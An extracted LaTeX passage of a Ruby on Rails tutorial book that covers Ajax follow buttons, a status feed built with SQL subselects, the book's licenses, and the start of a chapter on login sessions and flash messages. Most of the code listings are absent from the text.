In the case of an Ajax request, Rails automatically calls a \emph{JavaScript embedded Ruby} (\kode{.js.erb}) file with the same name as the action, i.e., \kode{create.js.erb} or \kode{destroy.js.erb}.
As you might guess, such files allow us to mix JavaScript and embedded Ruby to perform actions on the current page.
It is these files that we need to create and edit in order to update the user profile page upon being followed or unfollowed.
Inside a JS-ERb file, Rails automatically provides the \href{http://jquery.com/}{jQuery} JavaScript helpers to manipulate the page using the \href{http://www.w3.org/DOM/}{Document Object Model (DOM)}.
The jQuery library (which we saw briefly in Section~\ref{sec:image_validation}) provides a large number of methods for manipulating the DOM, but here we will need only two.
First, we will need to know about the dollar-sign syntax to access a DOM element based on its unique CSS~id.
For example, to manipulate the \kode{follow\_form} element, we will use the syntax
(Recall from Listing~\ref{code:follow_form_partial} that this is a \kode{div} that wraps the form, not the form itself.)
As you might guess, jQuery, like CSS, uses a dot~\kode{.}\ to manipulate CSS classes.
The second method we'll need is \kode{html}, which updates the HTML inside the relevant element with the contents of its argument.
For example, to replace the entire follow form with the string \kode{"foobar"}, we would write
Unlike plain JavaScript files, JS-ERb files also allow the use of embedded Ruby, which we apply in the \kode{create.js.erb} file to update the follow form with the \kode{unfollow} partial (which is what should show after a successful following) and update the follower count.
The result is shown in Listing~\ref{code:create_js_erb}.
This uses the \kode{escape\_javascript} method, which is needed to escape out the result when inserting HTML in a JavaScript file.
The JavaScript embedded Ruby to create a following relationship.
Note the presence of line-ending semicolons, which are characteristic of languages with syntax descended from \href{https://en.wikipedia.org/wiki/ALGOL}{ALGOL}.
The \kode{destroy.js.erb} file is analogous (Listing~\ref{code:destroy_js_erb}).
The Ruby JavaScript (RJS) to destroy a following relationship.
With that, you should navigate to a user profile page and verify that you can follow and unfollow without a page refresh.
Now that the follow buttons are working, we'll write some simple tests to prevent regressions.
To follow a user, we post to the relationships path and verify that the number of followed users increases by~1:
This tests the standard implementation, but testing the Ajax version is almost the same, with \kode{xhr :post} in place of plain \kode{post}:
This uses the \kode{xhr} method (for XmlHttpRequest) to issue an Ajax request, which causes the \kode{respond\_to} block in Listing~\ref{code:relationships_controller_ajax} to execute the proper JavaScript method.
The same parallel structure applies to deleting users, with \kode{delete} instead of \kode{post}.
Here we check that the followed user count goes down by~1 and include the relationship and followed user's id:
Putting the two cases together gives the tests in Listing~\ref{code:follow_button_tests}.
Tests for the follow and unfollow buttons. 
We come now to the pinnacle of our sample application: the status feed of microposts.
Appropriately, this section contains some of the most advanced material in the entire tutorial.
The full status feed builds on the proto-feed from Section~\ref{sec:a_proto_feed} by assembling an array of the microposts from the users being followed by the current user, along with the current user's own microposts.
Throughout this section, we'll proceed through a series of feed implementations of increasing sophistication.
To accomplish this, we will need some fairly advanced Rails, Ruby, and even SQL programming techniques.
Because of the heavy lifting ahead, it's especially important to review where we're going.
A recap of the final status feed, shown in Figure~\ref{fig:page_flow_home_page_feed_mockup}, appears again in Figure~\ref{fig:home_page_feed_mockup}.
A mockup of a user's Home page with a status feed.
\label{fig:home_page_feed_mockup}}<n>\end{figure}<n><n>  % section the_status_feed (end)<n><n>    \subsection{Motivation and strategy} % (fold)<n>    \label{sec:motivation_and_strategy}<n><n>
The basic idea behind the feed is simple.
The purpose of a feed is to pull out the microposts whose user ids correspond to the users being followed by the current user (and the current user itself), as indicated by the arrows in the diagram.
The feed for a user (id 1) following users with ids 2, 7, 8, and 10.
The key is to check all three requirements for the feed: microposts for both followed users and the user itself should be included in the feed, but a post from an \emph{unfollowed} user should not be included.
Based on the fixtures in Listing~\ref{code:users_fixtures_extra_users} and Listing~\ref{code:add_micropost_different_owner}, this means that Michael should see Lana's posts and his own posts, but not Archer's posts.
Converting these requirements to assertions and recalling that the \kode{feed} is in the User model (Listing~\ref{code:proto_status_feed}) gives the updated User model test shown in Listing~\ref{code:full_feed_test}.
A test for the status feed. 
Since the final feed implementation is rather intricate, we'll build up to it by introducing one piece at a time.
The first step is to think of the kind of query we'll need.
We need to select all the microposts from the \kode{microposts} table with ids corresponding to the users being followed by a given user (or the user itself).
We might write this schematically as follows:
microposts
In writing this code, we've guessed that SQL supports an \kode{IN} keyword that allows us to test for set inclusion. (Happily, it does.)
Recall from the proto-feed in Section~\ref{sec:a_proto_feed} that Active Record uses the \kode{where} method to accomplish the kind of select shown above, as illustrated in Listing~\ref{code:proto_status_feed}.
There, our select was very simple; we just picked out all the microposts with user id corresponding to the current user:
Here, we expect it to be more complicated, something like this:
We see from these conditions that we'll need an array of ids corresponding to the users being followed.
One way to do this is to use Ruby's \kode{map} method, available on any ``enumerable'' object, i.e., any object (such as an Array or a Hash) that consists of a collection of elements
The main requirement is that enumerable objects must implement an \kode{each} method to iterate through the collection.
We saw an example of this method in Section~\ref{sec:blocks}; as another example, we'll use \kode{map} to convert an array of integers to an array of strings:
=> ["1", "2", "3", "4"]
Using the \kode{join} method (Section~\ref{sec:arrays_and_ranges}), we can create a string composed of the ids by joining them on comma-space :
=> "1, 2, 3, 4"
We can use the above method to construct the necessary array of followed user ids by calling~\kode{id} on each element in \kode{user.following}.
For example, for the first user in the database this array appears as follows:
=> [4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
43, 44, 45, 46, 47, 48, 49, 50, 51]
In fact, because this sort of construction is so useful, Active Record provides it by default:
Here the \kode{following\_ids} method is synthesized by Active Record based on the \kode{has\_many :following} association (Listing~\ref{code:has_many_following_through_active_relationships}); the result is that we need only append \kode{\_ids} to the association name to get the ids corresponding to the \kode{user.following} collection.
A string of followed user ids then appears as follows:
=> "4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
43, 44, 45, 46, 47, 48, 49, 50, 51"
When inserting into an SQL string, though, you don't need to do this; the \kode{?}\ interpolation takes care of it for you (and in fact eliminates some database-dependent incompatibilities).
This means we can use \kode{following\_ids} by itself.
As a result, the initial guess of
actually works!
The result appears in Listing~\ref{code:initial_working_feed}
The initial working feed. 
# Returns a user's status feed.
The test suite should be \passing:
In some applications, this initial implementation might be good enough for most practical purposes, but Listing~\ref{code:initial_working_feed} isn't the final implementation; see if you can make a guess about why not before moving on to the next section.
(\emph{Hint}: What if a user is following 5000 other users?)
As hinted at in the last section, the feed implementation in Section~\ref{sec:a_first_feed_implementation} doesn't scale well when the number of microposts in the feed is large, as would likely happen if a user were following, say, 5000 other users.
In this section, we'll reimplement the status feed in a way that scales better with the number of followed users.
The problem with the code in Section~\ref{sec:a_first_feed_implementation} is that \kode{following\_ids} pulls \emph{all} the followed users' ids into memory, and creates an array the full length of the followed users array.
Since the condition in Listing~\ref{code:initial_working_feed} actually just checks inclusion in a set, there must be a more efficient way to do this, and indeed SQL is optimized for just such set operations.
The solution involves pushing the finding of followed user ids into the database using a \emph{subselect}.
We'll start by refactoring the feed with the slightly modified code in Listing~\ref{code:feed_second_cut}.
Using key-value pairs in the feed's \kode{where} method. 
                   following
As preparation for the next step, we have replaced
with the equivalent
                following
The question mark syntax is fine, but when we want the \emph{same} variable inserted in more than one place, the second syntax is more convenient.
The above discussion implies that we will be adding a \emph{second} occurrence of \kode{user\_id} in the SQL query.
In particular, we can replace the Ruby code
with the SQL snippet
This code contains an SQL subselect, and internally the entire select for user~1 would look something like this:
This subselect arranges for all the set logic to be pushed into the database, which is more efficient
With this foundation, we are ready for a more efficient feed implementation, as seen in Listing~\ref{code:feed_final}.
The final implementation of the feed. 
                     WHERE  follower_id = :user_id"
This code has a formidable combination of Rails, Ruby, and SQL, but it does the job, and does it well:
Of course, even the subselect won't scale forever.
For bigger sites, you would probably need to generate the feed asynchronously using a background job, but such scaling subtleties are beyond the scope of this tutorial.
With the code in Listing~\ref{code:feed_final}, our status feed is now complete.
Recall from Section~\ref{sec:a_proto_feed} that the Home page already includes the feed; as a reminder, the \kode{home} action appears again in Listing~\ref{code:real_feed_instance_variable}.
In Chapter~\ref{cha:user_microposts}, the result was only a proto-feed (Figure~\ref{fig:home_with_proto_feed}), but with the implementation in Listing~\ref{code:feed_final} as seen in Figure~\ref{fig:home_page_with_feed} the Home page now shows the full feed.
The \kode{home} action with a paginated feed.
The Home page with a working status feed.
At this point, we're ready to merge our changes into the master branch:
We can then push the code to the remote repository and deploy the application to production:
The result is a working status feed on the live Web (Figure~\ref{fig:live_status_feed}).
A working status feed on the live Web.
With the addition of the status feed, we've finished the sample application for the \emph{Ruby on Rails Tutorial}.
This application includes examples of all the major features of Rails, including models, views, controllers, templates, partials, filters, validations, callbacks, \kode{has\_many}/\kode{belongs\_to} and \kode{has\_many :through} associations, security, testing, and deployment.
Despite this impressive list, there is still much to learn about web development.
As a first step in this process, this section contains some suggestions for further learning.
<n><n>    \subsection{Guide to further resources} % (fold)<n>    \label{sec:guide_to_further_resources}<n><n>
There is a wealth of Rails resources in stores and on the web---indeed, the supply is so rich that it can be overwhelming.
The good news is that, having gotten this far, you're ready for almost anything else out there.
Here are some suggestions for further learning:
\href{http://screencasts.railstutorial.org/}{The Ruby on Rails Tutorial screencasts}: I offer a full-length screencast course based on this book.
In addition to covering all the material in the book, the screencasts are filled with tips, tricks, and the kind of see-how-it's-done demos that are hard to capture in print.
They are available for purchase through the \href{http://www.railstutorial.org/}{Ruby on Rails Tutorial website}.
\href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy}: Lots of in-person developer bootcamps have sprung up in recent years, and I recommend looking for one in your area, but \href{http://www.gotealeaf.com/railstutorial}{Tealeaf Academy} is available online and so can be taken from anywhere.
Tealeaf is an especially good choice if you want instructor feedback within the context of a structured curriculum.
Most of their students start with limited programming experience but have the determination and drive needed to pick it up quickly.
Turing guarantees its students will find a job after graduating or they'll refund the cost of tuition.
\href{http://www.thinkful.com/a/railstutorial}{Thinkful}: An online class that pairs you with a professional engineer as you work through a project-based curriculum.
Subjects include Ruby on Rails, front-end development, web design, and data science.
\href{https://tutorials.railsapps.org/hartl}{RailsApps}: Instructive sample Rails apps
\href{http://mbsy.co/6VQ8l}{Code School}: A large variety of interactive programming courses
\href{https://www.udemy.com/learn-test-driven-development-in-ruby/couponCode=hartl}{Bala Paranj's Test Driven Development in Ruby}: A more advanced online course focusing on TDD in pure Ruby
\href{http://railscasts.com/}{RailsCasts}: I suggest starting by visiting the \href{http://railscasts.com/episodes/archive}{RailsCasts episode archive} and clicking on subjects that catch your eye.
Ruby and Rails books: For further Ruby learning, I recommend \href{http://www.amazon.com/gp/product/1430223634}{\emph{Beginning Ruby}} by Peter Cooper, \href{http://www.amazon.com/gp/product/1933988657}{\emph{The Well-Grounded Rubyist}} by David~A. Black, \href{http://www.amazon.com/Eloquent-Ruby-Addison-Wesley-Professional-Series/dp/0321584104/}{\emph{Eloquent Ruby}} by Russ Olsen, and \href{http://www.amazon.com/gp/product/0672328844}{\emph{The Ruby Way}} by Hal Fulton.
For further Rails learning, I recommend \href{https://pragprog.com/book/rails4/agile-web-development-with-rails-4}{Agile Web Development with Rails} by Sam Ruby, Dave Thomas, and David Heinemeier Hansson, \href{http://www.amazon.com/Rails-Edition-Addison-Wesley-Professional-Series/dp/0321944275}{\emph{The Rails~4 Way}} by Obie Fernandez and Kevin Faustino, and \href{http://www.amazon.com/Rails-4-Action-Ryan-Bigg/dp/1617291099}{\emph{Rails~4 in Action}} by Ryan Bigg and Yehuda Katz.
<n><n>\end{itemize}<n><n>    % subsection guide_to_further_resources (end)<n><n>    \subsection{What we learned in this chapter} % (fold)<n>    \label{sec:following_users_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n>\item 
Rails' \kode{has\_many :through} allows the modeling of complicated data relationships.
The \kode{has\_many} method takes several optional arguments, including the object class name and the foreign key.
Using \kode{has\_many} and \kode{has\_many :through} with properly chosen class names and foreign keys, we can model both active (following) and passive (being followed) relationships.
Rails routing supports nested routes.
The \kode{where} method is a flexible and powerful way to create database queries.
Rails supports issuing lower-level SQL queries if needed.
By putting together everything we've learned in this book, we've successfully implemented user following with a status feed of microposts from followed users.
Write tests for the stats on the Home and profile pages.
\emph{Hint}: Add to the test in Listing~\ref{code:user_profile_test}.
(Why don't we have to test the stats on the Home page separately?)
Write a test to verify that the first page of the feed appears on the Home page as required.
A template appears in Listing~\ref{code:home_feed_test}.
Note the use of HTML escaping via \kode{CGI.escapeHTML}; see if you can figure out why this is necessary.
(Try removing the escaping and carefully inspect the page source for the micropost content that doesn't match.)
Testing the feed HTML. 
My former company (CD Baby) was one of the first to loudly switch to Ruby on Rails, and then even more loudly switch back to PHP (Google me to read about the drama).
This book by Michael Hartl came so highly recommended that I had to try it, and the \emph{Ruby on Rails Tutorial} is what I used to switch back to Rails again.
Though I've worked my way through many Rails books, this is the one that finally made me ``get'' it.
Everything is done very much ``the Rails way''---a way that felt very unnatural to me before, but now after doing this book finally feels natural.
This is also the only Rails book that does test-driven development the entire time, an approach highly recommended by the experts but which has never been so clearly demonstrated before.
Finally, by including Git, GitHub, and Heroku in the demo examples, the author really gives you a feel for what it's like to do a real-world project.
The tutorial's code examples are not in isolation.
The linear narrative is such a great format.
This is not typical!
Getting through the entire book usually takes \emph{much} longer than three days.
Do it from start to finish, without jumping around, and you'll get the ultimate benefit.
Enjoy!
\href{http://sivers.org/}{Derek Sivers} (\href{http://sivers.org/}{sivers.org})
Founder, CD Baby
Copyright and license
\emph{Ruby on Rails Tutorial: Learn Web Development with Rails}.
All source code in the \emph{Ruby on Rails Tutorial} is available jointly under the \href{http://opensource.org/licenses/MIT}{MIT License} and the \href{http://people.freebsd.org/~phk/}{Beerware License}.
The MIT License<n><n>Copyright (c) 2014 Michael Hartl<n><n>Permission is hereby granted, free of charge, to any person obtaining a copy<n>of this software and associated documentation files (the "Software"), to deal<n>in the Software without restriction, including without limitation the rights<n>to use, copy, modify, merge, publish, distribute, sublicense, and/or sell<n>copies of the Software, and to permit persons to whom the Software is<n>furnished to do so, subject to the following conditions:<n><n>The above copyright notice and this permission notice shall be included in<n>all copies or substantial portions of the Software.
<n><n>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR<n>IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,<n>FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE<n>AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER<n>LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,<n>OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN<n>THE SOFTWARE.
/*<n> * ----------------------------------------------------------------------------<n> * "THE BEERWARE LICENSE" (Revision 43):<n> * Michael Hartl wrote this code.
As long as you retain this notice you<n> * can do whatever you want with this stuff.
If we meet some day, and you think
<n> * this stuff is worth it, you can buy me a beer in return.
<n> * ----------------------------------------------------------------------------<n> */
Now that new users can sign up for our site (Chapter~\ref{cha:sign_up}), it's time to give them the ability to log in and log out.
We'll be implementing all three of the most common models for login/logout behavior on the web: ``forgetting'' users on browser close (Section~\ref{sec:sessions_and_failed_login} and Section~\ref{sec:logging_in}), \emph{automatically} remembering users (Section~\ref{sec:remember_me}), and \emph{optionally} remembering users based on the value of a ``remember me'' checkbox (Section~\ref{sec:remember_me_checkbox})
Another common model is to expire the session after a certain amount of time.
This is especially appropriate on sites containing sensitive information, such as banking and financial trading accounts.
The authentication system we develop in this chapter will allow us to customize the site and implement an authorization model based on login status and identity of the current user.
For example, in this chapter we'll update the site header with login/logout links and a profile link.
In Chapter~\ref{cha:updating_showing_and_deleting_users}, we'll impose a security model in which only logged-in users can visit the user index page, only the correct user can access the page for editing their information, and only administrative users can delete other users from the database.
Finally, in Chapter~\ref{cha:user_microposts}, we'll use the identity of a logged-in user to create microposts associated with that user, and in Chapter~\ref{cha:following_users} we'll allow the current user to follow other users of the application (thereby receiving a feed of their microposts).
This is a long and challenging chapter covering many detailed aspects of login common systems, so I recommend focusing on completing it section by section.
In addition, many readers have reported benefiting from going through it a second time.
\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}{HTTP} is a \href{https://en.wikipedia.org/wiki/Stateless_protocol}{\emph{stateless protocol}}, treating each request as an independent transaction that is unable to use information from any previous requests.
This means there is no way \href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#HTTP_session_state}{within the hypertext transfer protocol} to remember a user's identity from page to page; instead, web applications requiring user login must use a \href{http://en.wikipedia.org/wiki/Session_(computer_science)}{\emph{session}}, which is a semi-permanent connection between two computers (such as a client computer running a web browser and a server running Rails).
The most common techniques for implementing sessions in Rails involve using \href{http://en.wikipedia.org/wiki/HTTP_cookie}{\emph{cookies}}, which are small pieces of text placed on the user's browser.
Because cookies persist from one page to the next, they can store information (such as a user id) that can be used by the application to retrieve the logged-in user from the database.
Some browsers offer an option to restore such sessions via a ``continue where you left off'' feature, but of course Rails has no control over this behavior.
It's convenient to model sessions as a RESTful resource: visiting the login page will render a form for \emph{new} sessions, logging in will \emph{create} a session, and logging out will \emph{destroy} it.
Unlike the Users resource, which uses a database back-end (via the User model) to persist data, the Sessions resource will use cookies, and much of the work involved in login comes from building this cookie-based authentication machinery.
In this section and the next, we'll prepare for this work by constructing a Sessions controller, a login form, and the relevant controller actions.
We'll then complete user login in Section~\ref{sec:logging_in} by adding the necessary session-manipulation code.
As in previous chapters, we'll do our work on a topic branch and merge in the changes at the end:
The elements of logging in and out correspond to particular REST actions of the Sessions controller: the login form is handled by the \kode{new} action (covered in  this section), actually logging in is handled by sending a \texttt{POST} request to the \kode{create} action (Section~\ref{sec:logging_in}), and logging out is handled by sending a \texttt{DELETE} request to the \kode{destroy} action (Section~\ref{sec:logging_out}).
(Recall the association of HTTP verbs with REST actions from Table~\ref{table:RESTful_users}.)
To get started, we'll generate a Sessions controller with a \kode{new} action:
Following the model from Section~\ref{sec:signup_form} for the signup page, our plan is to create a login form for creating new sessions, as mocked up in Figure~\ref{fig:login_mockup}.
A mockup of the login form.
Unlike the Users resource, which used the special \kode{resources} method to obtain a full suite of RESTful routes automatically (Listing~\ref{code:users_resource}), the Sessions resource will use only named routes, handling \texttt{GET} and \texttt{POST} requests with the \kode{login} route and \texttt{DELETE} request with the \kode{logout} route.
The result appears in Listing~\ref{code:sessions_resource} (which also deletes the unneeded routes generated by \kode{rails generate controller}).
Adding a resource to get the standard RESTful actions for sessions.
The routes defined in Listing~\ref{code:sessions_resource} correspond to URLs and actions similar to those for users (Table~\ref{table:RESTful_users}), as shown in Table~\ref{table:RESTful_sessions}.
page for  a new session (login)
create a new session (login)
/logout
delete a session (log out)
Routes provided by the sessions rules in Listing~\ref{code:sessions_resource}.
Since we've now added several custom named routes, it's useful to look at the complete list of the routes for our application, which we can generate using \kode{rake routes}:
$ bundle exec rake routes<n> Prefix Verb   URI Pattern               Controller#Action<n>     root GET    /                         static_pages#home<n>     help GET    /help(.:format)           static_pages#help<n>    about GET    /about(.:format)          static_pages#about<n>  contact GET    /contact(.:format)        static_pages#contact<n>   signup GET    /signup(.:format)         users#new<n>    login GET    /login(.:format)          sessions#new<n>          POST   /login(.:format)          sessions#create<n>   logout DELETE /logout(.:format)         sessions#destroy<n>    users GET    /users(.:format)          users#index<n>          POST   /users(.:format)          users#create<n> new_user GET    /users/new(.:format)      users#new<n>edit_user GET    /users/:id/edit(.:format) users#edit<n>     user GET    /users/:id(.:format)      users#show<n>          PATCH  /users/:id(.:format)      users#update<n>          PUT    /users/:id(.:format)      users#update<n>          DELETE /users/:id(.:format)      users#destroy
It's not necessary to understand the results in detail, but viewing the routes in this manner gives us a high-level overview of the actions supported by our application.
Having defined the relevant controller and route, now we'll fill in the view for new sessions, i.e., the login form.
Comparing Figure~\ref{fig:login_mockup} with Figure~\ref{fig:signup_mockup}, we see that the login form is similar in appearance to the signup form, except with two fields (email and password) in place of four.
As seen in Figure~\ref{fig:login_failure_mockup}, when the login information is invalid we want to re-render the login page and display an error message.
In Section~\ref{sec:signup_error_messages}, we used an error-messages partial to display error messages, but we saw in that section that those messages are provided automatically by Active Record.
This won't work for session creation errors because the session isn't an Active Record object, so we'll render the error as a flash message instead.
A mockup of login failure.
Recall from Listing~\ref{code:signup_form} that the signup form uses the \kode{form\_for} helper, taking as an argument the user instance variable \kode{@user}:
The main difference between the session form and the signup form is that we have no Session model, and hence no analogue for the \kode{@user} variable.
This means that, in constructing the new session form, we have to give \kode{form\_for} slightly more information; in particular, whereas
allows Rails to infer that the \kode{action} of the form should be to \texttt{POST} to the URL /users, in the case of sessions we need to indicate the \emph{name} of the resource and the corresponding URL
A second option is to use \kode{form\_tag} in place of \kode{form\_for}, which might be even more idiomatically correct Rails, but it has less in common with the signup form, and at this stage I want to emphasize the parallel structure.
With the proper \kode{form\_for} in hand, it's easy to make a login form to match the mockup in Figure~\ref{fig:login_mockup} using the signup form (Listing~\ref{code:signup_form}) as a model, as shown in Listing~\ref{code:login_form}.
Code for the login form.
Note that we've added a link to the signup page for convenience.
With the code in Listing~\ref{code:login_form}, the login form appears as in Figure~\ref{fig:login_form}.
(Because the ``Log in'' navigation link hasn't yet been filled in, you'll have to type the /login URL directly into your address bar.
We'll fix this blemish in Section~\ref{sec:changing_the_layout_links}.)
The login form.
The generated form HTML appears in Listing~\ref{code:login_form_html}.
HTML for the login form produced by Listing~\ref{code:login_form}.
As in the case of creating users (signup), the first step in creating sessions (login) is to handle \emph{invalid} input.
We'll start by reviewing what happens when a form gets submitted, and then arrange for helpful error messages to appear in the case of login failure (as mocked up in Figure~\ref{fig:login_failure_mockup}.)
Then we'll lay the foundation for successful login (Section~\ref{sec:logging_in}) by evaluating each login submission based on the validity of its email/password combination.
Let's start by defining a minimalist \kode{create} action for the Sessions controller, along with empty \kode{new} and \kode{destroy} actions (Listing~\ref{code:initial_create_session}).
The \kode{create} action in Listing~\ref{code:initial_create_session} does nothing but render the \kode{new} view, but it's enough to get us started.
Submitting the \href{http://localhost:3000/sessions/new}{/sessions/new} form then yields the result shown in Figure~\ref{fig:initial_failed_login_rails_3}.
A preliminary version of the Sessions \kode{create} action.
The initial failed login, with \kode{create} as in Listing~\ref{code:initial_create_session}.
Carefully inspecting the debug information in Figure~\ref{fig:initial_failed_login_rails_3} shows that, as hinted at the end of Section~\ref{sec:login_form}, the submission results in a \kode{params} hash containing the email and password under the key \kode{session}, which (omitting some irrelevant details used internally by Rails) appears as follows:
As with the case of user signup (Figure~\ref{fig:signup_failure}), these parameters form a \emph{nested} hash like the one we saw in Listing~\ref{code:nested_hashes}.
In particular, \kode{params} contains a nested hash of the form
is itself a hash:
As a result,
is the submitted email address and
is the submitted password.
In other words, inside the \kode{create} action the \kode{params} hash has all the information needed to authenticate users by email and password.
Not coincidentally, we already have exactly the methods we need: the \kode{User.find\_by} method provided by Active Record (Section~\ref{sec:finding_user_objects}) and the \kode{authenticate} method provided by \kode{has\_secure\_password} (Section~\ref{sec:creating_and_authenticating_a_user}).
authentication
as shown in Listing~\ref{code:find_authenticate_user}.
Finding and authenticating a user.
The first highlighted line in Listing~\ref{code:find_authenticate_user} pulls the user out of the database using the submitted email address.
(Recall from Section~\ref{sec:uniqueness_validation} that email addresses are saved as all lower-case, so here we use the \kode{downcase} method to ensure a match when the submitted address is valid.)
The next line can be a bit confusing but is fairly common in idiomatic Rails programming:
Taking into account that any object other than \kode{nil} and \kode{false} itself is \kode{true} in a boolean context (Section~\ref{sec:objects_and_message_passing}), the possibilities appear as in Table~\ref{table:user_and_and}.
We see from Table~\ref{table:user_and_and} that the \kode{if} statement is \kode{true} only if a user with the given email both exists in the database and has the given password, exactly as required.
nonexistent
wrong password
right password
Recall from Section~\ref{sec:signup_error_messages} that we displayed signup errors using the User model error messages.
These errors are associated with a particular Active Record object, but this strategy won't work here because the session isn't an Active Record model.
Instead, we'll put a message in the flash to be displayed upon failed login.
A first, slightly incorrect, attempt appears in Listing~\ref{code:failed_login_attempt}.
An (unsuccessful) attempt at handling failed login.
The flash message for a failed login.
Unfortunately, as noted in the text and in the comment in Listing~\ref{code:failed_login_attempt}, this code isn't quite right.
The page looks fine, though, so what's the problem?
The issue is that the contents of the flash persist for one \emph{request}, but---unlike a redirect, which we used in Listing~\ref{code:signup_flash}---re-rendering a template with \kode{render} doesn't count as a request. The result is that the flash message persists one request longer than we want.
For example, if we submit invalid login information and then click on the Home page, the flash gets displayed a second time (Figure~\ref{fig:flash_persistence}).
Fixing this blemish is the task of Section~\ref{sec:a_flash_test}.
An example of flash persistence.
\label{fig:flash_persistence}}<n>\end{figure}<n><n><n>    % subsubsection rendering_with_a_flash_message (end)<n><n>  \subsection{A flash test} % (fold)<n>  \label{sec:a_flash_test}<n><n>
The incorrect flash behavior is a minor bug in our application.
We'll thus write a short integration test for the login form submission before proceeding.
In addition to documenting the bug and preventing a regression, this will also give us a good foundation for further integration tests of login and logout.
We start by generating an integration test for our application's login behavior:
Next, we need a test to capture the sequence shown in Figure~\ref{fig:failed_login_flash} and Figure~\ref{fig:flash_persistence}.
The basic steps appear as follows:
Visit the login path.
Verify that the new sessions form renders properly.
Post to the sessions path with an invalid \kode{params} hash.
Verify that the new sessions form gets re-rendered and that a flash message appears.
Visit another page (such as the Home page).
Verify that the flash message \emph{doesn't} appear on the new page.
A test implementing the above steps appears in Listing~\ref{code:flash_persistence_test}.
A test to catch unwanted flash persistence. 
login_path
$ bundle exec rake test TEST=test/integration/users_login_test.rb
This shows how to run one (and only one) test file using the argument \kode{TEST} and the full path to the file.
The way to get the failing test in Listing~\ref{code:flash_persistence_test} to pass is to replace \kode{flash} with the special variant \kode{flash.now}, which is specifically designed for displaying flash messages on rendered pages.
Unlike the contents of \kode{flash}, the contents of \kode{flash.now} disappear as soon as there is an additional request, which is exactly the behavior we've tested in Listing~\ref{code:flash_persistence_test}.
With this substitution, the corrected application code appears as in Listing~\ref{code:correct_login_failure}.
Correct code for failed login. 
We can then verify that both the login integration test and the full test suite are \passing:
$ bundle exec rake test TEST=test/integration/users_login_test.rb<n>$ bundle exec rake test
Now that our login form can handle invalid submissions, the next step is to handle valid submissions correctly by actually logging a user in.
In this section, we'll log the user in with a temporary session cookie that expires automatically upon browser close.
In Section~\ref{sec:remember_me}, we'll add sessions that persist even after closing the browser.
Implementing sessions will involve defining a large number of related functions for use across multiple controllers and views.
You may recall from Section~\ref{sec:back_to_the_title_helper} that Ruby provides a \emph{module} facility for packaging such functions in one place.
Conveniently, a Sessions helper module was generated automatically when generating the Sessions controller (Section~\ref{sec:sessions_controller}).
Moreover, such helpers are automatically included in Rails views; by including the module into the base class of all controllers (the Application controller), we arrange to make them available in our controllers as well (Listing~\ref{code:sessions_helper_include}).
Including the Sessions helper module into the Application controller.
With this configuration complete, we're now ready to write the code to log users in.
Logging a user in is simple with the help of the \kode{session} method defined by Rails.
(This method is separate and distinct from the Sessions controller generated in Section~\ref{sec:sessions_controller}.)
We can treat \kode{session} as if it were a hash, and assign to it as follows:
This places a temporary cookie on the user's browser containing an encrypted version of the user's id, which allows us to retrieve the id on subsequent pages using \kode{session[:user\_id]}.
In contrast to the persistent cookie created by the \kode{cookies} method (Section~\ref{sec:remember_me}), the temporary cookie created by the \kode{session} method expires immediately when the browser is closed.
Because we'll want to use the same login technique in a couple of different places, we'll define a method called \kode{log\_in} in the Sessions helper, as shown in Listing~\ref{code:log_in_function}.
The \kode{log\_in} function.
Because temporary cookies created using the \kode{session} method are automatically encrypted, the code in Listing~\ref{code:log_in_function} is secure, and there is no way for an attacker to use the session information to log in as the user.
This applies only to temporary sessions initiated with the \kode{session} method, though, and is \emph{not} the case for persistent sessions created using the \kode{cookies} method.
Permanent cookies are vulnerable to a \emph{session hijacking} attack, so in Section~\ref{sec:remember_me} we'll have to be much more careful about the information we place on the user's browser.
With the \kode{log\_in} method defined in Listing~\ref{code:log_in_function}, we're now ready to complete the session \kode{create} action by logging the user in and redirecting to the user's profile page.
The result appears in Listing~\ref{code:log_in_success}
The \kode{log\_in} method is available in the Sessions controller because of the module inclusion in Listing~\ref{code:sessions_helper_include}.
Logging in a user.
Note the compact redirect
which we saw before in Section~\ref{sec:the_finished_signup_form}.
Rails automatically converts this to the route for the user's profile page:
With the \kode{create} action defined in Listing~\ref{code:log_in_success}, the login form defined in Listing~\ref{code:login_form} should now be working.
It doesn't have any effects on the application display, though, so short of inspecting the browser session directly there's no way to tell that you're logged in.
As a first step toward enabling more visible changes, in Section~\ref{sec:current_user} we'll retrieve the current user from the database using the id in the session.
In Section~\ref{sec:changing_the_layout_links}, we'll change the links on the application layout, including a URL to the current user's profile.
Having placed the user's id securely in the temporary session, we are now in a position to retrieve it on subsequent pages, which we'll do by defining a \kode{current\_user} method to find the user in the database corresponding to the session id.
The purpose of \kode{current\_user} is to allow constructions such as
To find the current user, one possibility is to use the \kode{find} method, as on the user profile page (Listing~\ref{code:user_show_action}):
But recall from Section~\ref{sec:finding_user_objects} that \kode{find} raises an exception if the user id doesn't exist.
This behavior is appropriate on the user profile page because it will only happen if the id is invalid, but in the present case \kode{session[:user\_id]} will often be \kode{nil} (i.e., for non-logged-in users).
To handle this possibility, we'll use the same \kode{find\_by} method used to find by email address in the \kode{create} method, with \kode{id} in place of \kode{email}:
Rather than raising an exception, this method returns \kode{nil} (indicating no such user) if the id is invalid.
We could now define the \kode{current\_user} method as follows:
This would work fine, but it would hit the database multiple times if, e.g., \kode{current\_user} appeared multiple times on a page.
Instead, we'll follow a common Ruby convention by storing the result of \kode{User.find\_by} in an instance variable, which hits the database the first time but returns the instance variable immediately on subsequent invocations
